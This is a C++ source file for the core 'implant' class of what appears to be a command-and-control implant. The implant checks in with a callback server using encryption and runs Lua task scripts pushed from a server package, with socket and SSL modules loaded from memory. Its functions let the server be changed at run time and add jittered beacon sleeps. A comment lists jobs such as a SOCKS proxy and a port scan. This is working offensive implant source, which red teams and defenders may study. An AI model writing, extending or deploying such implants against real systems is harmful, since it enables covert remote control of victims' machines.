#include "implant.h"

#include <util/debug.hpp>
#include <util/zip.hpp>
#include <util/string.hpp>
#include <encryption.h>
#include <message.h>

#include "modules.h"

#define LUA_SUFFIX ".lua"
#define INIT_LUA "init" LUA_SUFFIX

implant::implant(const std::string &server,
                 const std::string &server_public_key_base64,
                 const std::vector<unsigned char> &callback_package)
    : _state(), _messages(&_state)
{
  // Setup state
  auto server_public_key_raw = util::base64::decode(server_public_key_base64);
  monocypher::key_exchange::public_key server_public_key;
  server_public_key.fillWith(server_public_key_raw.data(), server_public_key_raw.size());
  _state.callback_server_public_key = server_public_key;
  _state.callback_server(server);
  _state.callback_package(callback_package);

  // libhydrogen needs initialisation
  encryption::init();

  // Ensure new lua states have an output callback set and a set of standard modules preloaded
  moon_newstate_cb(on_newstate, this);

  // Create message handlers
  _handler_hello = std::make_shared<handler::hello>(&_state);
  _handler_task = std::make_shared<handler::task>(&_state);
  _handler_job = std::make_shared<handler::job>(&_state);
}

void implant::run() {
  _state.is_running = true;

  // Ensure that the messages object are loaded when lua states are created in this thread (i.e. for comms)
  thread_storage::luaopen_objects.emplace_back("messages", &_messages);

  // Create lua state for running communications
  lua_State* L = luaL_newstate();

  // Push a "hello" task so that the implant completes an initial checkin with the server
  auto message = std::make_shared<shared::message>(_state.id, "hello", "");
  _state.dispatcher.push_received("server", message);

  moon_output_cb(L, [](lua_State *LS, const void* data, size_t length, void *userdata) {
    auto i = (implant*) userdata;
    ERROR_PRINT("%s - %s", i->_state.id, std::string((char*)data, length));
  }, this);

  std::string script;
  {
    try {
      util::zip::zip_file zip(_state.callback_package());
      if (zip.has_file(INIT_LUA))
        script = zip.read(INIT_LUA);
      else
        ERROR_PRINT("No 'init.lua' script found in package\n");
    }
    catch(const std::runtime_error &e) {
      ERROR_PRINT("%s", e.what());
    }
  }

  if (!script.empty()) {
    moon_addmemz(L, _state.callback_package().data(), _state.callback_package().size());
    moon_doscript(L, 0, nullptr, script.data(), script.size());
  }

  lua_close(L);
  _state.is_running = false;
}

void implant::stop() {
  _state.is_running = false;
}

bool implant::is_running() const {
  return _state.is_running;
}

void implant::on_newstate(lua_State *L, void *userdata) {
  // Callback which is executed when a new lua state is created - this will
  // apply globally for all lua states created in the running process.
  auto i = (implant*) userdata;

  //std::thread::id thread_id = std::this_thread::get_id();
  //DEBUG_PRINT("on_newstate() called in thread %zu\n", std::hash<std::thread::id>()(thread_id));

  // Open default lua libraries
  luaL_openlibs(L);

  // Preload implant lua object
  register_lua_object(L, "implant", i);

  // Preload any thread local lua objects that have been registered
  for (const auto &pair : thread_storage::luaopen_objects) {
    register_lua_object(L, pair.first, pair.second);
  }

  // Preload a standard set of modules
#if defined(_WIN32)
  moon_addmemc(L, "socket.core", socket_core_dll_array, socket_core_dll_size, 1);
  moon_addmemc(L, "mime.core", mime_core_dll_array, mime_core_dll_size, 1);
  moon_addmemc(L, "ssl", ssl_dll_array, ssl_dll_size, 1);
  //moon_addmemc(L, "luv", luv_dll_array, luv_dll_size, 1);
  moon_addmemc(L, "struct", struct_dll_array, struct_dll_size, 1);
#else
  moon_addmemc(L, "socket.core", socket_core_so_array, socket_core_so_size, 1);
  moon_addmemc(L, "mime.core", mime_core_so_array, mime_core_so_size, 1);
  moon_addmemc(L, "ssl", ssl_so_array, ssl_so_size, 1);
  //moon_addmemc(L, "luv", luv_so_array, luv_so_size, 1);
  moon_addmemc(L, "struct", struct_so_array, struct_so_size, 1);
#endif
  moon_addmeml(L, "socket", socket_lua_array, socket_lua_size, 1);
  moon_addmeml(L, "socket.http", socket_http_lua_array, socket_http_lua_size, 1);
  moon_addmeml(L, "socket.url", socket_url_lua_array, socket_url_lua_size, 1);
  moon_addmeml(L, "ltn12", ltn12_lua_array, ltn12_lua_size, 1);
  moon_addmeml(L, "mime", mime_lua_array, mime_lua_size, 1);
  moon_addmeml(L, "socket.headers", socket_headers_lua_array, socket_headers_lua_size, 1);
  moon_addmeml(L, "ssl", ssl_lua_array, ssl_lua_size, 1);
  moon_addmeml(L, "ssl.https", ssl_https_lua_array, ssl_https_lua_size, 1);

  moon_addmeml(L, "copas", copas_lua_array, copas_lua_size, 1);
  moon_addmeml(L, "binaryheap", binaryheap_lua_array, binaryheap_lua_size, 1);
  moon_addmeml(L, "coxpcall", coxpcall_lua_array, coxpcall_lua_size, 1);
  moon_addmeml(L, "timerwheel", timerwheel_lua_array, timerwheel_lua_size, 1);

  // Setup default callback for output produced by a script
  moon_output_cb(L, [](lua_State *LS, const void* data, size_t length, void *userdata) {
    ERROR_PRINT("%s\n", std::string((char*)data, length));
  }, i);
}

int implant::luaopen_object(lua_State *L) {
  lua_newtable(L);
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_jobs>, 1);
  lua_setfield(L, -2, "jobs");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_exit>, 1);
  lua_setfield(L, -2, "exit");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_dwell>, 1);
  lua_setfield(L, -2, "dwell");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_server>, 1);
  lua_setfield(L, -2, "server");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_callback_package>, 1);
  lua_setfield(L, -2, "callback_package");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_running>, 1);
  lua_setfield(L, -2, "running");
  lua_pushlightuserdata(L, this);
  lua_pushcclosure(L, &dispatch_to_member<implant, &implant::lua_sleep>, 1);
  lua_setfield(L, -2, "sleep");
  return 1;
}

int implant::lua_jobs(lua_State* L) {
  /*
  {
    [1] = { ["id"] = "dmci34nr2", ["name"] = "Socks Proxy"},
    [2] = { ["id"] = "ek5kvr94j", ["name"] = "Port Scan"}
  }
  */
  auto list = _handler_job->list();
  // Creates parent table of size 'list.size()' array elements
  lua_createtable(L, list.size(), 0);
  for (int i = 0; i < list.size(); i++) {
    // Put key of the child table on-top of Lua VM stack
    lua_pushnumber(L, i);
    // Create child table of size 2 non-array elements
    lua_createtable(L, 0, 2);
    // Fill the child table
    lua_pushstring(L, list[i].first.c_str());
    lua_setfield(L, -2, "id");
    lua_pushstring(L, list[i].second.c_str());
    // setfield() pops the value from Lua VM stack.
    lua_setfield(L, -2, "name");
    // Remember, child table is on-top of the stack.
    // lua_settable() pops key, value pair from Lua VM stack.
    lua_settable(L, -3);
  }
  // return 1 multidimentional table
  return 1;
}

int implant::lua_exit(lua_State* L) {
  _state.is_running = false;
  DEBUG_PRINT("Exiting\n");
  return 0;
}

int implant::lua_dwell(lua_State* L) {
  const double dwell = luaL_optnumber(L, 1, -1.0);
  if (dwell > 0) {
    _state.dwell_period = (float)dwell;
    DEBUG_PRINT("Dwell period changed to %.1f seconds\n", (float)dwell);
    return 0;
  }
  else {
    lua_pushnumber(L, (double)_state.dwell_period);
    return 1;
  }
}

int implant::lua_server(lua_State* L) {
  const char* callback_server = luaL_optstring(L, 1, NULL);
  if (callback_server != nullptr) {
    _state.callback_server(callback_server);
    DEBUG_PRINT("Server changed to %s\n", callback_server);
    return 0;
  }
  else {
    auto server = _state.callback_server();
    lua_pushlstring(L, server.data(), server.length());
    return 1;
  }
}

int implant::lua_callback_package(lua_State* L) {
  size_t length;
  const char* callback_script = luaL_checklstring(L, 1, &length);
  _state.callback_package(util::string::convert(callback_script, length));
  DEBUG_PRINT("Callback package changed to %s\n", util::base64::encode(_state.callback_package()));
  return 0;
}

int implant::lua_running(lua_State* L) {
  lua_pushboolean(L, _state.is_running ? 1 : 0); // push result
  return 1; // number of return values
}

int implant::lua_sleep(lua_State* L) {
  const double dwell = luaL_optnumber(L, 1, -1.0);

  double period = _state.dwell_period;
  if (dwell > 0)
    period = (float)dwell;

  std::random_device rd;
  std::mt19937 generator(rd());
  std::uniform_real_distribution<> distribution(0.0, 1.0);
  double random = distribution(generator);
  double variant_seconds = period * (DWELL_VARIATION_LOWER + random * (DWELL_VARIATION_UPPER - DWELL_VARIATION_LOWER));
  DEBUG_PRINT("Sleeping for %f seconds\n", variant_seconds);
  std::this_thread::sleep_for(std::chrono::milliseconds{ static_cast<unsigned long long>(variant_seconds * 1000) });

  return 0; // number of return values
}
